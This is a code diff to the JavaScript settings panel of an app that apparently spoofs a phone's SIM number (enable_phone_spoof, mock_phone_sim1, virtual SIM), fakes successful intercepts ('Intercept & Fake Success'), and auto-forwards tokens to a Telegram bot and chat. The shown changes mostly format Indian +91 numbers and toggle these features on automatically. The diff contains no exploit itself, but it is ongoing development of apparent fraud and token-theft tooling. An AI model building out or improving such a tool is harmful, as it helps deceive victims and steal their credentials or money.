@@ -18,11 +18,23 @@
     }
   }
 
+  /** Last 10 Indian digits from +91 / 91 / raw */
   function digitsPhone(v) {
-    let s = String(v || "").replace(/[^\d+]/g, "");
-    if (s.startsWith("+91") && s.length > 10) s = s.slice(-10);
-    else s = s.replace(/\D/g, "");
+    let s = String(v || "").replace(/\D/g, "");
+    if (s.startsWith("91") && s.length >= 12) s = s.slice(-10);
+    else if (s.length > 10) s = s.slice(-10);
     return s;
+  }
+
+  function formatDisplay(digits) {
+    const d = digitsPhone(digits);
+    if (d.length < 10) return d;
+    return d.slice(0, 5) + " " + d.slice(5);
+  }
+
+  function formatE164(digits) {
+    const d = digitsPhone(digits);
+    return d.length >= 10 ? "+91" + d : d;
   }
 
   function interceptOn() {
@@ -32,18 +44,40 @@
   }
 
   function syncBodies() {
-    const map = [
+    [
       ["swFake", "bodyFake"],
       ["swPrefix", "bodyPrefix"],
       ["swSender", "bodySender"],
       ["swTg", "bodyTg"],
-    ];
-    map.forEach(([sw, body]) => {
+    ].forEach(([sw, body]) => {
       const s = $("#" + sw);
       const b = $("#" + body);
       if (!s || !b) return;
+      // Phone body always open when fake on OR has number
+      if (sw === "swFake") {
+        const has = digitsPhone(($("#phoneInput") || {}).value || "").length >= 10;
+        b.classList.toggle("open", !!s.checked || has);
+        return;
+      }
       b.classList.toggle("open", !!s.checked);
     });
+  }
+
+  function paintLiveRail() {
+    const phoneOn =
+      ($("#swFake") && $("#swFake").checked) ||
+      digitsPhone(($("#phoneInput") || {}).value || cfg.mock_phone_sim1 || "").length >= 10;
+    const tgOn =
+      ($("#swTg") && $("#swTg").checked) ||
+      (!!(cfg.telegram_bot_token && cfg.telegram_chat_id));
+    const set = (id, on) => {
+      const el = $("#" + id);
+      if (!el) return;
+      el.classList.toggle("on", !!on);
+    };
+    set("pillPhone", phoneOn);
+    set("pillIntercept", interceptOn());
+    set("pillTg", tgOn);
   }
 
   function paintInterceptLabels() {
@@ -61,9 +95,10 @@
       hint.classList.toggle("on", on);
       hint.classList.toggle("off", !on);
     }
+    paintLiveRail();
   }
 
-  function paintSaveStatus(force) {
+  function paintSaveStatus(force, phoneE164) {
     const box = $("#saveStatus");
     if (!box) return;
     if (!force) {
@@ -72,13 +107,19 @@
       return;
     }
     const on = interceptOn();
+    const parts = [];
+    if (on) parts.push("Intercept & Fake Success On ✅");
+    else parts.push("Intercept & Fake Success Off");
+    if (phoneE164 && phoneE164.length >= 12) {
+      parts.push("Number synced " + phoneE164);
+    }
     box.hidden = false;
-    if (on) {
-      box.textContent = "Intercept & Fake Success On ✅";
-      box.classList.remove("off");
-    } else {
-      box.textContent = "Intercept & Fake Success Off";
-      box.classList.add("off");
+    box.textContent = parts.join(" · ");
+    box.classList.toggle("off", !on);
+    const meta = $("#phoneMeta");
+    if (meta && phoneE164 && phoneE164.length >= 12) {
+      meta.textContent = "Module updated · " + phoneE164;
+      meta.classList.add("ok");
     }
   }
 
@@ -95,13 +136,19 @@
       if (k === "auto_forward_token" && cfg.telegram_enabled != null) {
         v = cfg.telegram_enabled || v;
       }
-      if (k === "mock_phone_sim1") v = digitsPhone(v);
+      if (k === "mock_phone_sim1") {
+        const d = digitsPhone(v);
+        el.value = d.length >= 10 ? formatDisplay(d) : d;
+        return;
+      }
       if (el.type === "checkbox") {
         el.checked = v === true || v === "true";
       } else {
         el.value = v == null ? "" : String(v);
       }
     });
+    const d = digitsPhone(cfg.mock_phone_sim1);
+    if (d.length >= 10 && $("#swFake")) $("#swFake").checked = true;
     syncBodies();
     paintInterceptLabels();
   }
@@ -111,14 +158,17 @@
     $$("[data-key]").forEach((el) => {
       const k = el.dataset.key;
       if (el.type === "checkbox") out[k] = el.checked;
-      else if (k === "mock_phone_sim1") out[k] = digitsPhone(el.value);
+      else if (k === "mock_phone_sim1") out[k] = formatE164(el.value);
       else out[k] = el.value.trim();
     });
 
-    out.fake_number_enabled = !!out.enable_sim1_mock;
-    out.enable_phone_spoof = !!out.enable_sim1_mock;
-    out.enable_virtual_sim =
-      !!out.enable_sim1_mock && !!(out.mock_phone_sim1 && String(out.mock_phone_sim1).length >= 10);
+    const digits = digitsPhone(out.mock_phone_sim1);
+    out.fake_number_enabled = !!out.enable_sim1_mock || digits.length >= 10;
+    out.enable_sim1_mock = out.fake_number_enabled;
+    out.enable_phone_spoof = out.fake_number_enabled;
+    out.enable_virtual_sim = digits.length >= 10;
+    if (digits.length >= 10) out.mock_phone_sim1 = formatE164(digits);
+
     out.intercept_enabled = !!out.intercept_fake_success;
     out.telegram_enabled = !!out.auto_forward_token;
     out.fake_intercept_telegram = !!out.auto_forward_token;
@@ -148,15 +198,24 @@
     if (b) b.saveConfig(JSON.stringify(next));
     cfg = next;
     dirty = false;
+    const e164 = formatE164(next.mock_phone_sim1);
+    // Keep phone field looking clean after save
+    const pin = $("#phoneInput");
+    if (pin && digitsPhone(e164).length >= 10) {
+      pin.value = formatDisplay(e164);
+      if ($("#swFake")) $("#swFake").checked = true;
+    }
+    syncBodies();
     paintInterceptLabels();
-    paintSaveStatus(true);
+    paintSaveStatus(true, e164);
     const btn = $("#btnSave");
     if (btn) {
       btn.classList.add("saved");
-      btn.textContent = "Saved ✓";
+      const label = btn.querySelector(".btn-label") || btn;
+      label.textContent = "Saved ✓";
       setTimeout(() => {
         btn.classList.remove("saved");
-        btn.textContent = "Update / Save";
+        label.textContent = "Update / Save";
       }, 1600);
     }
   }
@@ -175,6 +234,26 @@
   $("#btnMin")?.addEventListener("click", () => {
     location.href = "hivirtus://minimize";
   });
+
+  const phoneInput = $("#phoneInput");
+  if (phoneInput) {
+    phoneInput.addEventListener("input", () => {
+      dirty = true;
+      let d = digitsPhone(phoneInput.value);
+      // Allow typing freely; lightly format when 10 digits reached
+      if (d.length > 10) d = d.slice(-10);
+      if (d.length === 10) {
+        const cur = phoneInput.selectionStart;
+        const formatted = formatDisplay(d);
+        if (phoneInput.value.replace(/\s/g, "") !== d) {
+          phoneInput.value = formatted;
+        }
+        if ($("#swFake")) $("#swFake").checked = true;
+      }
+      syncBodies();
+      paintLiveRail();
+    });
+  }
 
   function load(force) {
     if (!force && dirty) return;
@@ -202,6 +281,7 @@
   }
 
   $$("input").forEach((el) => {
+    if (el.id === "phoneInput") return;
     el.addEventListener("change", () => {
       dirty = true;
       cfg = collect();
@@ -210,9 +290,8 @@
     });
     el.addEventListener("input", () => {
       dirty = true;
-      if (el.type !== "checkbox") {
-        cfg = collect();
-      }
+      if (el.type !== "checkbox") cfg = collect();
+      paintLiveRail();
     });
   });
 
